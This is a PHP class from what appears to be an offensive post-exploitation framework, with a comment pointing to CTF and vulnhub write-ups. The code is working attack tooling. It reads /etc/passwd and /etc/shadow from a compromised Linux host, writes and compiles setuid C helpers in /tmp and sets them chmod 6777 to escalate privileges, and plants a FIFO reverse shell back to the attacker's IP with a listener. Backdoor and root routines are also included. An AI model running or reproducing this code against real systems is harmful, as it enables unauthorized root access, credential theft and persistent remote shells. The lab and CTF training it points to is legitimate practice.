<?php


/*
 https://hackingresources.com/category/ctf-writeups/vulnhub-writeups/
 https://hackso.me/
 https://emaragkos.gr/recommended-machines/
 http://overthewire.org/wargames/
 https://www.hackingarticles.in/ctf-challenges-walkthrough/
 https://pentest.training/virtualmachines.php
 http://captf.com/practice-ctf/
 https://practicalpentestlabs.com/
 https://www.virtualhackinglabs.com/
 vulnhub writeups
 
 https://github.com/initstring/uptux
 */

class lan4linux extends LAN{
    var $lan2where ;
    var $templateB64_id ;
    var $template_id ;
    var $template_shell ;
    var $templateB64_shell ;
    
    var $id8str ;
    var $id8b64 ;
    var $uid ;
    var $uid_name;
    var $gid;
    var $gid_name;
    var $context;
    
    var $tab_users_etc_passwd ;
    var $tab_users_shell ;
    var $tab_users_gid_root;
    
    var $etc_passwd_str ;
    var $shell_version ;
    
    var $path_remotebin_socat;


    public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_shell,$id8b64) {
        parent::__construct($eth,$domain,$ip,$port,$protocol,$stream);
        
        $rst_id = base64_decode($id8b64);
        list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id8str) = $this->parse4id($rst_id);
        
        $this->id8str = $id8str;
        $this->id8b64 = base64_encode($id8str);
        $this->uid = trim($uid);
        $this->uid_name = trim($uid_name);
        $this->gid = trim($gid);
        $this->gid_name = trim($gid_name);
        $this->templateB64_id = trim($templateB64_id);
        $this->template_id = base64_decode($this->templateB64_id);
        $this->templateB64_shell = trim($templateB64_shell);
        $this->template_shell = base64_decode($this->templateB64_shell);
        $this->context = trim($context);
        
      
        $this->lan2where = "id8port = '$this->port2id' AND uid_name = '$this->uid_name' AND templateB64_id = '$this->templateB64_id' AND templateB64_shell = '$this->templateB64_shell' AND uid = '$this->uid' AND gid = '$this->gid' AND gid_name = '$this->gid_name' AND context = '$this->context' AND id8b64 = '$this->id8b64' ";
        
        
        if (empty($this->uid_name)) {$this->log2error("Empty USERNAME");exit();}
        
        if ($this->context !== "listening_Server" ){
            $sql_r = "SELECT templateB64_id FROM LAN WHERE $this->lan2where ORDER BY ladate DESC LIMIT 1 ";           
            //echo "$sql_r\n";
            if ($this->checkBD($sql_r)) {
                if ($this->check4id8db($this->port2id,$this->templateB64_id,$this->id8b64)!==FALSE){
                    $chaine = "Escalation Already Done for $this->uid_name";
                    $this->article($this->uid_name, $this->id8str);
                    $this->log2error($chaine);
                    $this->rouge("out from ".__FUNCTION__);$this->pause();
                    $this->lan2brief();
                    exit() ;  
                }
            }
        
        else {
            $sql_w = "INSERT INTO LAN (id8port,uid_name,templateB64_id,templateB64_shell,uid,gid,gid_name,context,id8b64) VALUES ('$this->port2id','$this->uid_name','$this->templateB64_id','$this->templateB64_shell','$this->uid','$this->gid','$this->gid_name','$this->context','$this->id8b64'); ";
            echo "$sql_w\n";
            $this->mysql_ressource->query($sql_w);
            //$this->cmd("localhost","echo '$this->root_passwd' | sudo -S tshark -i $this->eth_wlan  host $this->ip -w $this->dir_tmp/$this->ip.pcap");
            echo $this->rouge("Working on LAN for the first time");
            
        }

        
        }
         
        
        $this->lan2init();

    }
    
    
    
    
    
    
    
    
    
    public function lan2init(){
        
        $this->titre(__FUNCTION__);
        $tab_tmp = array();
        
        $this->article("Template ID", $this->template_id);
        $this->article("Template SHELL", $this->template_shell);
         
        
        echo "=============================================================================\n";
        
        $data = "cat /etc/passwd ";
        $tmp = $this->lan2stream4result($data,$this->stream_timeout*2);
        $tmp2 = array();
        exec("echo '$tmp' | grep ':' ",$tmp2);
        $this->etc_passwd_str = $this->tab($tmp2);
        $this->etc_passwd_str = trim($this->etc_passwd_str);
        $this->parse4etc_passwd($this->etc_passwd_str);
        unset($tmp2);
        
        $this->pause();
        
        $this->lan2init2var();
        //$this->lan2init2app();
        //$this->lan2start();
        
        
        $data = "cat /etc/shadow ";
        $tmp = $this->req_str($this->stream,$data,$this->stream_timeout,"");
        exec("echo '$tmp' | grep ':'   ",$tab_tmp);
        $shadow_str = $this->tab($tab_tmp);
        if ( (!empty($shadow_str)) && (strstr($shadow_str, "root:")) ){
            $this->root8shadow($shadow_str,$this->etc_passwd_str);
        }
        
    }
    
    public function lan2init2var(){
        $this->titre(__FUNCTION__);
        $data = "uname -r";
        $os_kernel = trim($this->lan2stream4result($data,$this->stream_timeout*2));
        
        $data = "uname -s";
        $os_plateforme = trim($this->lan2stream4result($data,$this->stream_timeout*2));
        
        $this->os_kernel_number = trim($this->req_ret_str("echo \"$os_kernel\" | grep -Po \"[2-4]{1}\.[0-9]{1,2}\.[0-9]{1,3}\-[[:print:]]{1,}\" "));
        $this->os_plateforme_name = trim($this->req_ret_str("echo \"$os_plateforme\" | grep -i -E \"(linux|windows|debian|unix)\" "));
        $this->ip2os4arch($this->os_plateforme_name);
        $this->parse4kernel($this->os_kernel_number);
    }
    
    public function lan2init2app(){
        $this->titre(__FUNCTION__);
        $this->note("What development tools/languages are installed/supported?");
        $this->lan2init2app8executable();
        $this->path_compiler_c = $this->lan2init2app8compiler();
        $this->path_snifer = $this->lan2init2app8snifer();
        
        $this->note("How can files be uploaded?");
        $this->path_webbrowser_cli = $this->lan2init2app8webbrowser();
        $this->path_compiler_c = $this->lan2init2app8socket();
        
        
    }
    
    


    
    
    public function lan2init2app8executable(){
        $this->ssTitre(__FUNCTION__);
        $filename = "perl";
        echo $this->lan2file4locate($filename);
        
        $filename = "php";
        echo $this->lan2file4locate($filename);
        
        $filename = "python";
        echo $this->lan2file4locate($filename);
        
        $filename = "ruby";
        echo $this->lan2file4locate($filename);
        
        $filename = "java";
        echo $this->lan2file4locate($filename);
        
        $filename = "go";
        echo $this->lan2file4locate($filename);
        
        $filename = "gdb";
        echo $this->lan2file4locate($filename);
        
        $filename = "find";
        echo $this->lan2file4locate($filename);
        
        $filename = "grep";
        echo $this->lan2file4locate($filename);
        
        $filename = "strings";
        echo $this->lan2file4locate($filename);
    }
    
    public function lan2init2app8snifer(){
        $this->ssTitre(__FUNCTION__);
        $filename = "tcpdump";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        $filename = "nmap";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        $filename = "hping";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        $filename = "hping3";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
    }
    
    public function lan2init2app8socket(){
        $this->ssTitre(__FUNCTION__);

        
        $filename = "nc";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        
        $filename = "netcat";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc) ;
        
        $filename = "ncat";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        
        $filename = "tcpbind";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        
        $filename = "ssh";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        
        $filename = "ftp";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc) ;
        
        $filename = "tftp";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        
        $filename = "telnet";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        
        
    }
    
    
    public function lan2init2app8webbrowser(){
        $this->ssTitre(__FUNCTION__);
        
        $filename = "wget";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        
        $filename = "curl";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        
        $filename = "w3m";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc) ;
        
        $filename = "elinks";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        
        $filename = "lynx";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        
        $filename = "fetch";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc) ;
        
        $filename = "lwp-download";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        
    }
    
    
    public function lan2init2app8compiler(){
        $this->ssTitre(__FUNCTION__);
        
        $filename = "gcc";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        
        $filename = "cc";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc);
        
        $filename = "clang";
        $path_gcc = $this->lan2file4locate($filename);
        if (!empty($path_gcc)) return trim($path_gcc) ;
    }
    
    
    public function uid8db():bool{
        $sql_w = "SELECT id8b64 FROM LAN WHERE $this->lan2where ";
        $query = "mysql --user=$this->mysql_login --password=$this->mysql_passwd --database=$this->mysql_database --execute=\"$sql_w\"  2>/dev/null \n";
        $this->requette($query);
        fgets(STDIN);
        return $this->checkBD($sql_w);
    }
    
    
    public function root4pentest(){
        $result = "";
        $this->titre(__FUNCTION__);
        
        
        /*
        $tab_flag_name = array("user.txt","root.txt","flag.txt");
        foreach ($tab_flag_name as $flag_name){
            if (!$this->file4exist8name($this->stream,$flag_name)){
                $flag_path = $this->file4locate($this->stream,$flag_name);
                $data = "cat $flag_path";
                if (!empty($flag_path)) $this->lan2stream4result($data, $this->stream_timeout*3);
            }
        }
        */
        
        $this->backdoor4root($this->stream);
        
        //$this->lan2pivot($this->stream);
        
        return $result;
        
        $shell = $this->lan2shell();$this->article("SHELL",$shell);$result .= $shell ; $this->pause();
        $os = $this->lan2os();$this->article("OS",$os); $result .= $os ; $this->pause();
        $info = $this->lan2infos(); $this->article("INFOS",$info);$result .= $info ; $this->pause();
        $users = $this->lan2users();$this->article("USERS",$users); $result .= $users ; $this->pause();
        $lhost = $this->lan2lhost();$this->article("LHOST",$lhost);$result .= $lhost; $this->pause();
        $network = $this->lan2network();$this->article("NETWORK",$network);$result .= $network;      $this->pause();
        $bins = $this->lan2bins();$this->article("BINS",$bins);$result .= $bins ;  $this->pause();
        $hw = $this->lan2hw();$this->article("HW",$hw);$result .= $hw ; $this->pause();
        $ps = $this->lan2ps();$this->article("PS",$ps);$result .= $ps ; $this->pause();
        $tools = $this->lan2tools();$this->article("TOOLS",$tools);$result .= $tools; $this->pause();
        $pids = $this->lan2pid();$this->article("PIDs",$pids);$result .= $pids ; $this->pause();
        
        
        
        return $result;
    }
    
    
    public function lan2root(){
        /*
         https://guide.offsecnewbie.com/privilege-escalation/linux-pe
         https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux
         https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List
         */
        $this->gtitre(__FUNCTION__);
        $sql = "update IP set ip2backdoor=0 where ip2backdoor=1 ;" ;
        $query = "mysql --user=$this->mysql_login --password=$this->mysql_passwd --database=$this->mysql_database --execute=\"$sql\"  2>/dev/null \n";
        //$this->requette($query);
        
        $sql = "update IP set ip2root=0 where ip2root=1 ;";
        $query = "mysql --user=$this->mysql_login --password=$this->mysql_passwd --database=$this->mysql_database --execute=\"$sql\"  2>/dev/null \n";
        //$this->requette($query);
        
        

        
        $this->rouge($this->id8str);
        
        if ( $this->uid_name==="root" ) {
            $this->rouge("YES ROOT PAWNED");
            
            if (!$this->ip2backdoor8db($this->ip2id)) {

                $this->root4pentest();$this->pause();
                $this->lan2brief();
                exit();
            }
        }
        else {
            //if (!$this->ip2root8db($this->ip2id)) {$this->misc($this->stream);$this->pause();}
            if (!$this->ip2root8db($this->ip2id)) {$this->suids($this->stream);$this->pause();}
            //if (!$this->ip2root8db($this->ip2id)) {$this->users($this->stream);$this->pause();}
            //if (!$this->ip2root8db($this->ip2id)) {$this->jobs($this->stream);$this->pause();}
            //if (!$this->ip2root8db($this->ip2id)) {$this->exploits($this->stream);$this->pause();}
        }
        
        $this->lan2brief();
    }
    
    
    
    
    
    
    
    
    
    public function pentest8id($stream,$template_id_euid){
        
        $this->titre(__FUNCTION__);
        $attacker_ip = $this->ip4addr4target($this->ip);
        $attacker_port = rand(1024,65535);
        $shell = "/bin/bash";
        
        if ($this->ip2root8db($this->ip2id)) return $this->log2succes("IP already rooted");
        if (!strstr($template_id_euid, "%ID%")) return $this->log2error("There is NO %ID% into Template:$template_id_euid");
        $template_id = $template_id_euid;
        $templateB64_id = trim(base64_encode($template_id));
        $euid = "";
        $euid_name = "";
        $egid = "";
        $egid_name = "";
        $groups = "";
        
        $id = "id";
        $cmd_id = str_replace("%ID%", $id, $template_id);
        $rst_id = $this->req_str($stream,$cmd_id,$this->stream_timeout*3,"");
        //var_dump($rst_id);
        
        
        while ( strstr($rst_id, "[sudo] password for ")!==FALSE || strstr($rst_id, "s password:")!==FALSE || strstr($rst_id, "Permission denied, please try again.")!==FALSE){
            $chaine = "Asking Password";
            $this->rouge($chaine);
            $data = "";
            $rst_id = $this->req_str($stream,$data,$this->stream_timeout,"");
            
        }
        
        
        
        list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context,$id8str) = $this->parse4id($rst_id);
        
        $id8b64 = base64_encode($id8str);
        if (!empty($uid_name) ){
            
            if ( empty($euid_name)){
                if ($uid_name !== $this->uid_name) {
                $this->article("Old UID NAME", $this->uid_name);
                $this->log2succes("check new USER:$uid_name");$this->pause();

                $cmd = str_replace("%ID%","%SHELL%",$template_id) ;
                $cmd = addcslashes($cmd, '"');
                $template_shell = str_replace("%SHELL%",$cmd,$this->template_shell);
                $templateB64_shell = base64_encode($template_shell);
                
                $templateB64_id = base64_encode($template_id);
                $this->article("CREATE Template ID", $template_id);
                $this->article("CREATE Template SHELL", $template_shell);
                $this->pause();
                
                $obj_lan_root1 = new lan4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $this->stream,$templateB64_id,$templateB64_shell,$id8b64);
                $obj_lan_root1->poc($this->flag_poc);
                $obj_lan_root1->lan2check8id($attacker_ip,$attacker_port,$shell);$this->pause();
                
              
                
            }
            
            }
            if (!empty($euid_name) ){
                if ($this->uid_name !==$euid_name){
                $this->rouge("try to spawn $euid_name ");$this->pause();
                
                $template_id_new = $this->lan2spawn2shell8euid($template_id,$euid_name);$this->pause();
                
                
                $cmd_id = str_replace("%ID%", $id, $template_id_new);
                $rst_id = $this->lan2stream4result($cmd_id,$this->stream_timeout);
                list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context,$id8str) = $this->parse4id($rst_id);
                $id8b64 = base64_encode($id8str);
                
                $templateB64_id_check = base64_encode($template_id_new);
                if ($this->lan2check4id8db($this->port2id, $templateB64_id_check, $id8b64)){
                    $this->rouge($id8str);
                    $chaine = "Escalation Already Done for this $uid_name and ID";
                    $this->article($uid_name, $id8str);
                    $this->log2error($chaine);
                    $this->rouge("out from ".__FUNCTION__);$this->pause();
                    
                    return 0 ;
                }
                else {
                    $chaine = "Escalation for the first time for this $uid_name and ID";
                    $this->article($uid_name, $id8str);
                    $this->log2succes($chaine);
                    $this->pause();
                }
                
                $template_id = $template_id_new;
                $templateB64_id = base64_encode($template_id);
                
                $template_shell = str_replace("%ID%","%SHELL%",$template_id);
                $templateB64_shell = base64_encode($template_shell);

                $template_id = "%ID%";
                $templateB64_id = base64_encode($template_id);
                $this->article("OLD Template ID", $this->template_id);
                
                $obj_lan_root = new lan4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $this->stream,$templateB64_id,$templateB64_shell,$id8b64);
                $obj_lan_root->poc($this->flag_poc);
                
                $this->pause();
                
                if ($this->uid_name !== $obj_lan_root->uid_name){
                    
                    $chaine = "spawning $obj_lan_root->uid_name";
                    $this->log2succes($chaine);
                                        
                    $this->pause();
                    //stream_copy_to_stream($this->stream, $stream);
                    
                    $cmd_id = str_replace("%ID%", $id, $obj_lan_root->template_id);$this->pause();
                    
                    
                    if ($obj_lan_root->uid_name==="root" ) {
                        $this->log2succes("Yes RooT running infos");
                    }
                    else {                       
                        $this->log2succes("$obj_lan_root->uid_name is not root checking again");
                    }
                    $obj_lan_root->lan2check8id($attacker_ip, $attacker_port, $shell);$this->pause();
                }
            }
            }
        }
        $this->rouge("out from ".__FUNCTION__);$this->pause();
    }
    
    
    
    
    public function lan2spawn2shell8euid($stream,$template_id,$euid_name){
        $this->ssTitre(__FUNCTION__);
        $result = "";
        $euid_name = trim($euid_name);
        
        if ($euid_name==="root") $homeuser = "/root";
        else $homeuser = "/home/$euid_name";
        
        $cmd_id = str_replace("%ID%", "id", $template_id);
        
        
        $data = "$cmd_id";
        $rst_id = $this->req_str($stream,$data,$this->stream_timeout,"");
        $hashname = sha1("$this->templateB64_id");
        if (strstr($rst_id, "euid=")) {
            
            $seteuid = <<<EOC
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
int main(void){
setuid(0);
setgid(0);
system("/bin/bash -c id");
return 0;
}
EOC;
            
            $seteuid = <<<EOC
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
int main(void){
printf("Before uid:%d euid:%d gid:%d egid:%d\\n",getuid(),geteuid(),getgid(),getegid());
setreuid(geteuid(),getuid());
setregid(getegid(),getgid());
printf("After uid:%d euid:%d gid:%d egid:%d\\n",getuid(),geteuid(),getgid(),getegid());
system("/bin/bash -c id");
return 0;
}
EOC;
            
            
            $elf = new bin4linux("/tmp/seteuid_id_$euid_name");
            $query = "echo '$seteuid' > $elf->file_path.c  ";
            $this->req_str($stream,$query,$this->stream_timeout,"");
            $query = "ls -al $elf->file_path.c ";
            $this->req_str($stream,$query,$this->stream_timeout,"");
            $data = "bash -p -c 'gcc -o $elf->file_path $elf->file_path.c && chmod 6777 $elf->file_path'";
            $data2 = str_replace("%ID%",$data, $template_id);
            $this->req_str($stream,$data2,$this->stream_timeout,"");
            $data = "ls -al $homeuser ";
            $this->req_str($stream,$query,$this->stream_timeout,"");
            $data = str_replace("%ID%","$elf->file_path", $template_id);
            $rst_id = $this->req_str($stream,$data,$this->stream_timeout,"");
            
            list($uid_found,$username_found,$gid_found,$groupname_found,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
            $id8b64 = base64_encode($id);
            
            
            if ( !empty($username_found) ){
                
                $chaine = "Try to Spawn USER:$euid_name via USER:$this->uid_name";
                $this->note($chaine);
                
                
                
                
                $this->article("username found", $username_found);
                
                $this->article("username now", $this->uid_name);
                
                
                if ($this->uid_name !== $username_found){
                    $chaine = "yes USER:$username_found spawned via USER:$this->uid_name";
                    $this->log2succes($chaine);
                    
                    
                    $seteuid = <<<EOC
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
int main(int argc, char **argv){
setreuid(geteuid(),getuid());
setregid(getegid(),getgid());
printf("Argv %s\\n",argv[1]);
execl("/bin/bash","bash","-c",argv[1], NULL);
return 0;
}
EOC;
                    $elf = new bin4linux("/tmp/shell_id_$euid_name");
                    $query = "echo '$seteuid' > $elf->file_path.c  ";
                    $this->req_str($stream,$query,$this->stream_timeout,"");
                    $query = "ls -al $elf->file_path.c ";
                    $this->req_str($stream,$query,$this->stream_timeout,"");
                    $data = "bash -p -c 'gcc -o $elf->file_path $elf->file_path.c && chmod 6777 $elf->file_path'";
                    $data2 = str_replace("%ID%",$data, $template_id);
                    $this->req_str($stream,$data2,$this->stream_timeout,"");
                    $data = "ls -al $homeuser ";
                    $this->req_str($stream,$query,$this->stream_timeout,"");
                    $data = str_replace("%ID%","$elf->file_path id", $template_id);
                    $rst_id = $this->req_str($stream,$data,$this->stream_timeout,"");
                    
                    list($new_uid_found,$new_username_found,$new_gid_found,$new_groupname_found,$new_euid,$new_username_euid,$new_egid,$new_groupname_egid,$new_groups,$context,$id8b64) = $this->parse4id($rst_id);
                    
                    
                    if ( !empty($new_username_found) ){
                        if ( $new_username_found===$euid_name ){
                            $chaine = "Succes Spawn $euid_name";
                            $this->log2succes($chaine);
                            
                            $new_templateB64_id = "$elf->file_path '%ID%' ";
                            $this->article("New TEMPLATE B64", $new_templateB64_id);
                            $this->pause();
                            return $new_templateB64_id;
                        }
                    }
                    
                    
                }
                else {
                    $chaine = "NOT spawned USER:$this->uid_name to USER:$euid_name ";
                    $this->rouge($chaine);$this->pause();
                    
                }
            }
            
        }
        
        
        return $template_id ;
    }
    
    
    
    
    public function lan2stream4result($data,$timeout){
        $data= trim($data);
        $this->article("Template", $this->template_id);
        $cmd = str_replace("%ID%", $data, $this->template_id);
        $cmd_exec = base64_encode($cmd);
        //$cmd = "echo '$cmd_exec' | base64 -d | bash -  ";
        return $this->req_str($this->stream, $cmd, $timeout,"");
    }
    
    public function lan2check8id($attacker_ip, $attacker_port, $shell){
        $this->ssTitre(__FUNCTION__);
        
        $query = str_replace("%SHELL%", "id", $this->template_shell);
        $this->requette("$query | grep 'uid=' ");
        $this->pause();

        
        $attacker_ip = $this->ip4addr4target($this->ip);
        $attacker_port = rand(1024,65535);
        $shell = "/bin/bash";
        $cmd_rev  = $this->rev8fifo($attacker_ip, $attacker_port, $shell);
        $hash = sha1($cmd_rev);
        $data = "echo \"#!/bin/bash\n$cmd_rev\" > /tmp/$hash.sh ; chmod 6777 /tmp/$hash.sh";
        $this->req_str($this->stream,$data, $this->stream_timeout,"");       
        $data = "ls -al /tmp/$hash.sh";
        $this->req_str($this->stream,$data, $this->stream_timeout,"");
        $data = "cat /tmp/$hash.sh";
        $this->req_str($this->stream,$data, $this->stream_timeout,"");
        
        $cmd = str_replace("%SHELL%", "/tmp/$hash.sh", $this->template_shell);
        $this->str2file("", $cmd_rev, "/tmp/$hash.sh");
        //$cmd = str_replace("%SHELL%", $cmd_rev, $this->template_shell);
        
        
        $lprotocol = 'T' ;
        $type = "server";
        $this->service4lan($cmd, $this->templateB64_shell, $attacker_port, $lprotocol, $type);
        
        
    }
    
    

}
?>
